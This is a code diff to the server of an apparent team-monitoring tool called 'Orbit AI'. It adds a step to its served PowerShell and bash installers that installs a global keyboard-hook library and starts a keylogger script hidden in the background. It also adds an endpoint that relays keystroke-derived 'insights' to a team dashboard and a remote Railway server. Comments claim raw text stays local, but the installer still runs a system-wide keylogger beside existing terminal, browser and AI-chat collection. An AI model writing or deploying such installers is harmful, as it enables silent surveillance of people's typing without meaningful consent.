@@ -1174,11 +1174,22 @@ if (-not (Test-Path $extDir)) { New-Item -ItemType Directory -Path $extDir -Forc
 Copy-Item "$ORBIT\\vscode-extension\\*" -Destination $extDir -Force -ErrorAction SilentlyContinue
 Write-Host "✓ VS Code 확장 설치됨 (재시작 후 활성화)" -ForegroundColor Green
 
+# 11. 키로거 의존성 설치 + 백그라운드 시작
+Write-Host "키 입력 분석 모듈 설치 중..." -ForegroundColor Yellow
+Push-Location $ORBIT
+npm install uiohook-napi better-sqlite3 --silent 2>$null
+New-Item -ItemType Directory -Path "$ORBIT\\src\\data" -Force | Out-Null 2>$null
+if (-not (Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*keylogger*"})) {
+    Start-Process "node" -ArgumentList "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src" -WindowStyle Hidden
+    Write-Host "✓ 키 입력 로컬 분석 시작 (원문 로컬 저장, 결과만 Ollama 분석)" -ForegroundColor Green
+}
+Pop-Location
+
 Write-Host ""
 Write-Host "✅ Orbit AI 설치 완료!" -ForegroundColor Green
 Write-Host "   로컬: http://localhost:${port}" -ForegroundColor Cyan
 Write-Host "   팀 대시보드: ${serverUrl}" -ForegroundColor Cyan
-Write-Host "수집 항목: Claude Code · VS Code · 터미널 · 브라우저 · AI 대화" -ForegroundColor White
+Write-Host "수집 항목: Claude Code · VS Code · 터미널 · 브라우저 · AI 대화 · 키 입력 패턴" -ForegroundColor White
 `;
 
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
@@ -1281,11 +1292,20 @@ mkdir -p "$EXT_DIR"
 cp -r "$ORBIT/vscode-extension/"* "$EXT_DIR/" 2>/dev/null || true
 echo "✓ VS Code 확장 설치됨 (재시작 후 활성화)"
 
+# 11. 키로거 의존성 설치 + 백그라운드 시작
+echo "키 입력 분석 모듈 설치 중..."
+cd $ORBIT && npm install uiohook-napi better-sqlite3 --silent 2>/dev/null || true
+mkdir -p "$ORBIT/src/data"
+pgrep -f "keylogger.js" &>/dev/null || {
+  nohup node $ORBIT/src/keylogger.js > $ORBIT/src/keylog.log 2>&1 &
+  echo "✓ 키 입력 로컬 분석 시작 (원문 로컬 저장, 결과만 Ollama 분석)"
+}
+
 echo ""
 echo "✅ Orbit AI 설치 완료!"
 echo "   로컬: http://localhost:${port}"
 echo "   팀 대시보드: ${serverUrl}"
-echo "수집 항목: Claude Code · VS Code · 터미널 · 브라우저 · AI 대화"
+echo "수집 항목: Claude Code · VS Code · 터미널 · 브라우저 · AI 대화 · 키 입력 패턴"
 `;
 
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
@@ -1567,6 +1587,51 @@ app.post('/api/browser-activity', (req, res) => {
       } catch {}
     }
   }
+  res.json({ ok: true });
+});
+
+// ── 키로거 인사이트 수신 (keylogger.js → 여기) ────────────────────────────
+// 원문 절대 미포함 — Ollama 분석 결과(패턴/주제/활동)만 수신
+app.post('/api/keylog-insight', (req, res) => {
+  const { insightId, insight, timestamp, fromRemote } = req.body;
+  if (!insight) return res.status(400).json({ error: 'insight required' });
+
+  // 원문 코드/텍스트 필드가 들어오면 거부 (프라이버시 보호)
+  if (insight.rawText || insight.content || insight.keystrokes) {
+    return res.status(400).json({ error: '원문 필드는 허용되지 않습니다' });
+  }
+
+  // WebSocket 브로드캐스트 (대시보드 실시간 표시)
+  if (typeof broadcastAll === 'function') {
+    broadcastAll({
+      type:      'keylog_insight',
+      insightId: insightId || `ki-${Date.now()}`,
+      insight,             // topic, language, activity, keywords, context
+      timestamp: timestamp || new Date().toISOString(),
+    });
+  }
+
+  // Railway 포워딩 (분석 결과만, 원문 없음)
+  if (!fromRemote) {
+    const railwayUrl = process.env.RAILWAY_PUBLIC_DOMAIN
+      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : null;
+    if (railwayUrl && !process.env.RAILWAY_ENVIRONMENT) {
+      try {
+        const https = require('https');
+        const body  = JSON.stringify({ insightId, insight, timestamp, fromRemote: true });
+        const reqFwd = https.request({
+          hostname: new URL(railwayUrl).hostname, port: 443,
+          path: '/api/keylog-insight', method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
+        }, r => r.resume());
+        reqFwd.on('error', () => {});
+        reqFwd.setTimeout(5000, () => reqFwd.destroy());
+        reqFwd.write(body); reqFwd.end();
+      } catch {}
+    }
+  }
+
+  console.log(`[키로거] 인사이트 수신: ${insight.topic} (${insight.activity})`);
   res.json({ ok: true });
 });
 
